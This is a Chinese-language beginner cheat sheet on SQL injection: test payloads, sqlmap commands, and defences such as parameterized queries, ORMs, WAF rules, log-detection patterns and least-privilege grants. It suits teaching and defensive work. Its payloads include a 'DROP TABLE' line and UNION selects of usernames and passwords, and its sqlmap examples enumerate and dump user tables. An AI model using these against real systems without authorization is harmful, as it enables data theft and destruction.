---
order: 180
title: SQL 注入检测与防御
module: 'cybersecurity'
category: 云与基础设施
difficulty: beginner
description: 'SQL 注入检测与防御命令：注入类型与探测手法、sqlmap 自动化测试、参数化查询与数据库最小权限加固'
author: fanquanpp
updated: '2026-09-12'
related:
  - 'cybersecurity/280-WebSecurityDeep'
  - 'cybersecurity/190-XSSAttack'
  - 'cybersecurity/160-OWASPTop10Detailed'
  - 'cybersecurity/270-CommandInjection'
prerequisites:
  - 'cybersecurity/010-SecurityBasicsDefense'
---

## SQL 注入识别

**基本写法：经典注入测试载荷**
```sql
`' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin'#
' OR 1=1 --`
```
```sql
# 经典 SQL 注入测试载荷
' OR '1'='1' --
```

**基本写法：数字型注入测试**
```sql
`1 OR 1=1
1; DROP TABLE users--
1 UNION SELECT NULL--
1 UNION SELECT username, password FROM users--`
```
```sql
# 数字型 SQL 注入测试
1 OR 1=1
1 UNION SELECT username, password FROM users--
```

**基本写法：UNION 注入**
```sql
`' UNION SELECT NULL--
' UNION SELECT username, password FROM users--
' UNION SELECT table_name FROM information_schema.tables--`
```
```sql
# UNION 注入获取数据
' UNION SELECT username, password FROM users--
```

---

## sqlmap 自动化检测

**基本写法：检测 URL 是否存在注入**
`sqlmap -u "<URL>"`
```bash
# 检测目标 URL 是否存在 SQL 注入
sqlmap -u "http://example.com/page?id=1"
```

**基本写法：指定注入参数**
`sqlmap -u "<URL>" -p <参数>`
```bash
# 指定检测 id 参数
sqlmap -u "http://example.com/page?id=1" -p id
```

**基本写法：POST 请求检测**
`sqlmap -u "<URL>" --data "<数据>"`
```bash
# 检测 POST 请求的注入
sqlmap -u "http://example.com/login" --data "username=admin&password=123"
```

**基本写法：使用 Cookie**
`sqlmap -u "<URL>" --cookie="<Cookie>"`
```bash
# 带认证 Cookie 检测
sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"
```

**基本写法：指定数据库类型**
`sqlmap -u "<URL>" --dbms=<数据库>`
```bash
# 指定数据库类型为 MySQL
sqlmap -u "http://example.com/page?id=1" --dbms=mysql
```

---

## sqlmap 数据提取

**基本写法：枚举数据库**
`sqlmap -u "<URL>" --dbs`
```bash
# 列出所有数据库
sqlmap -u "http://example.com/page?id=1" --dbs
```

**基本写法：枚举表**
`sqlmap -u "<URL>" -D <数据库> --tables`
```bash
# 列出指定数据库的表
sqlmap -u "http://example.com/page?id=1" -D mydb --tables
```

**基本写法：枚举列**
`sqlmap -u "<URL>" -D <数据库> -T <表> --columns`
```bash
# 列出表的列
sqlmap -u "http://example.com/page?id=1" -D mydb -T users --columns
```

**基本写法：导出数据**
`sqlmap -u "<URL>" -D <数据库> -T <表> --dump`
```bash
# 导出表中的所有数据
sqlmap -u "http://example.com/page?id=1" -D mydb -T users --dump
```

**基本写法：导出指定列**
`sqlmap -u "<URL>" -D <数据库> -T <表> -C <列1>,<列2> --dump`
```bash
# 导出指定列的数据
sqlmap -u "http://example.com/page?id=1" -D mydb -T users -C username,password --dump
```

---

## 参数化查询防御

**基本写法：Java 参数化查询**
```java
`String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();`
```
```java
// Java 使用 PreparedStatement 防止 SQL 注入
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setInt(1, userId);
ResultSet rs = stmt.executeQuery();
```

**基本写法：Python 参数化查询**
```python
`cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
```
```python
# Python 使用参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**基本写法：Node.js 参数化查询**
```javascript
`db.query('SELECT * FROM users WHERE id = ?', [userId], callback)`
```
```javascript
// Node.js 使用参数化查询
db.query('SELECT * FROM users WHERE id = ?', [userId], (err, results) => {
  // 处理结果
});
```

**基本写法：PHP PDO 参数化**
```php
`$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);`
```
```php
// PHP PDO 参数化查询
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);
```

---

## ORM 防御

**基本写法：Hibernate HQL**
```java
`String hql = "FROM User WHERE id = :id";
Query query = session.createQuery(hql);
query.setParameter("id", userId);`
```
```java
// Hibernate 使用命名参数
String hql = "FROM User WHERE id = :id";
Query query = session.createQuery(hql);
query.setParameter("id", userId);
```

**基本写法：Django ORM**
```python
`User.objects.filter(id=user_id)`
```
```python
# Django ORM 自动参数化
User.objects.filter(id=user_id)
```

**基本写法：SQLAlchemy**
```python
`session.query(User).filter(User.id == user_id)`
```
```python
# SQLAlchemy ORM 自动参数化
session.query(User).filter(User.id == user_id)
```

---

## 输入验证

**基本写法：白名单验证**
```python
`import re
if re.match(r'^[0-9]+$', user_id):
    # 安全处理`
```
```python
# 只允许数字的输入验证
import re
if re.match(r'^[0-9]+$', user_id):
    safe_id = int(user_id)
```

**基本写法：类型转换**
```python
`user_id = int(user_id)`
```
```python
# 强制类型转换防止注入
user_id = int(request.args.get('id'))
```

**基本写法：长度限制**
```python
`if len(username) <= 50:
    # 处理输入`
```
```python
# 限制输入长度
username = request.form.get('username', '')[:50]
```

---

## WAF 规则防御

**基本写法：ModSecurity 规则**
```apache
`SecRule ARGS "(?i)(union|select|insert|update|delete|drop)" "id:1001,phase:2,deny,status:403"`
```
```apache
# ModSecurity 防止 SQL 注入
SecRule ARGS "(?i)(union|select|insert|update|delete|drop)" "id:1001,phase:2,deny,status:403"
```

**基本写法：Nginx 防注入规则**
```nginx
`if ($args ~* "union.*select") {
    return 403;
}`
```
```nginx
# Nginx 简单防 SQL 注入
if ($args ~* "union.*select.*from") {
    return 403;
}
```

---

## 日志监控

**基本写法：检测 SQL 注入尝试**
```bash
`grep -iE "union.*select|'--|' or '1'='1" /var/log/nginx/access.log`
```
```bash
# 在日志中检测 SQL 注入特征
grep -iE "union.*select|'--|' or '1'='1|;.*drop" /var/log/nginx/access.log
```

**基本写法：统计可疑 IP**
```bash
`grep -iE "union.*select" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn`
```
```bash
# 统计 SQL 注入尝试的 IP
grep -iE "union.*select|' or '1'='1" /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

**基本写法：实时监控注入尝试**
```bash
`tail -f /var/log/nginx/access.log | grep --line-buffered -iE "union.*select|'--"`
```
```bash
# 实时监控 SQL 注入尝试
tail -f /var/log/nginx/access.log | grep --line-buffered -iE "union.*select|'--|' or '1'='1"
```

---

## 数据库最小权限

**基本写法：创建只读用户**
`GRANT SELECT ON <数据库>.<表> TO '<用户>'@'<主机>' IDENTIFIED BY '<密码>';`
```sql
# 创建只读数据库用户
CREATE USER 'webuser'@'localhost' IDENTIFIED BY 'strongpassword';
GRANT SELECT ON mydb.* TO 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

**基本写法：限制 DROP 权限**
`GRANT SELECT, INSERT, UPDATE ON <数据库>.* TO '<用户>'@'<主机>';`
```sql
# 只授予必要权限不含 DROP
GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

**基本写法：撤销危险权限**
`REVOKE DROP, ALTER ON <数据库>.* FROM '<用户>'@'<主机>';`
```sql
# 撤销 DROP 和 ALTER 权限
REVOKE DROP, ALTER ON mydb.* FROM 'webuser'@'localhost';
FLUSH PRIVILEGES;
```

---

## 错误信息处理

**基本写法：关闭数据库错误显示**
```php
`error_reporting(0);
ini_set('display_errors', 0);`
```
```php
// PHP 关闭错误显示防止信息泄露
error_reporting(0);
ini_set('display_errors', 0);
```

**基本写法：自定义错误页面**
```python
`try:
    cursor.execute(sql)
except Exception as e:
    log_error(e)
    return "服务器错误", 500`
```
```python
# Python 捕获异常返回通用错误
try:
    cursor.execute(sql)
except Exception as e:
    log_error(e)
    return "服务器内部错误", 500
```

**基本写法：Django 隐藏调试信息**
```python
`DEBUG = False
ALLOWED_HOSTS = ['example.com']`
```
```python
# Django 生产环境配置
DEBUG = False
ALLOWED_HOSTS = ['example.com']
```
